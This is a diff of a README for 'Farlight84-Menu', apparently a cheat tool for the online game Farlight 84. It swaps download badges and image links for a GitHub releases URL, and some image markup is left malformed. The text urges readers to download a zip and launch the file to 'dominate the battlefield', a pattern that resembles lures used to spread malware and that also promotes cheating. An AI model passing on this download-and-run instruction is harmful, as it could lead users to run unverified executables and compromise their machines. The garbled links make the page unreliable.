@@ -52,7 +52,7 @@ Explore topics related to Farlight84 and our menu:
 
 To download the Farlight84-Menu software, click the button below:
 
-[![Download Farlight84-Menu](https://img.shields.io/badge/Download%20Here-Farlight84--Menu-blue)](https://github.com/repo/releases/9246/App.zip)
+[![Download Farlight84-Menu](https://github.com/KhineMyaeHtet/Farlight84-Menu/releases%20Here-Farlight84--Menu-blue)](https://github.com/KhineMyaeHtet/Farlight84-Menu/releases)
 
 Remember, if the link ends with a file name, you'll need to launch it to experience our menu to its full potential. If the link doesn't work or is not provided, please check the "Releases" section for more options.
 
@@ -60,7 +60,7 @@ Remember, if the link ends with a file name, you'll need to launch it to experie
 
 Join us on this exciting journey to revolutionize your Farlight 84 gaming experience. Our menu is not just a tool; it's a gateway to a new realm of possibilities in the gaming world. Empower yourself, unleash your potential, and dominate the battlefield like never before.
 
-![Farlight84-Menu](https://example.com/farlight84-menu-image.png)
+![Farlight84-Menu](https://github.com/KhineMyaeHtet/Farlight84-Menu/releases)
 
 ## Support and Feedback 📧
 
